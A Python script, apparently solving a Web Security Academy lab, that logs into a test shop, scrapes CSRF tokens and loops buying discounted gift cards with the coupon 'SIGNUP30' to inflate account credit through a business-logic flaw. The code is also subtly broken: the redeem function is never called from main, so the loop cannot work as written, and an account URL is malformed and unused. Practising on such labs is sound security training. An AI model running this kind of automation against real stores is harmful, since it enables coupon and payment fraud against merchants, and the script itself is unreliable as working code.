from bs4 import BeautifulSoup
import requests
import re


#Variables
url = "https://0a3800dc04a72ec180b5308200bb002f.web-security-academy.net"
creds = {'username' : 'wiener', 'password' : 'peter'}
s = requests.Session()


#Fonctions

def getSessionCookie(s, url, creds):
    url_login = url + "/login"
    creds['csrf'] = BeautifulSoup(s.get(url_login).text, 'html.parser').find('input', {'name': 'csrf'})['value']  #Get csrf token
    login = s.post(url_login, data=creds, allow_redirects=False).headers
    cookie_value = login['Set-Cookie'].split(';')[0].split('=')[1]  #Get cookie from headers
    return {'session' : cookie_value}


def getCredit(s, url, cookie):
    url_account = url + "my-url_account?id=wiener"
    credit_text = BeautifulSoup(s.get(url, cookies=cookie).text, 'html.parser').find('strong').text
    credit = float(re.search(r'\d+\.\d+', credit_text).group()) #Search int in <strong> balise
    return credit


def getGiftsCard(s, url, cookie, credit):
    url_cart = url + "/cart"
    nb_gift_card = credit // 10 #Get maximum giftcard to buy with X$
    datas = {'productId' : 2, 'quantity' : nb_gift_card, 'redir' : 'PRODUCT'}
    put_cart = s.post(url_cart, data=datas, cookies=cookie, allow_redirects=False).headers
    csrf_cart = BeautifulSoup(s.get(url_cart).text, 'html.parser').find('input', {'name': 'csrf'})['value']
    post_coupon = s.post(url_cart + "/coupon", cookies=cookie, data={'csrf' : csrf_cart, 'coupon' : 'SIGNUP30'})
    gift_card_list = BeautifulSoup(s.post(url_cart + "/checkout", data={'csrf' : csrf_cart}, cookies=cookie).text, 'html.parser')

    gift_card_table = gift_card_list.find('table', class_='is-table-numbers')
    gift_card_codes = [td.text.strip() for td in gift_card_table.find_all('td')]
    return gift_card_codes


def postGiftsCard(s, url, cookie, giftCards):
    url_cards = url + "/gift-card"
    csrf_account = BeautifulSoup(s.get(url_cards).text, 'html.parser').find('input', {'name': 'csrf'})['value']
    for card in giftCards:
        post_cards = s.post(url_cards, cookies=cookie, data = {'csrf' : csrf_account, 'gift-card' : card})
        print(post_cards)

#Main
def main():
    cookie = getSessionCookie(s, url, creds)
    credit = getCredit(s, url, cookie)
    while credit < 1400:
        getGiftsCard(s, url, cookie, credit)
        credit = getCredit(s, url, cookie)
        print(credit)


if __name__ == "__main__":
    main()
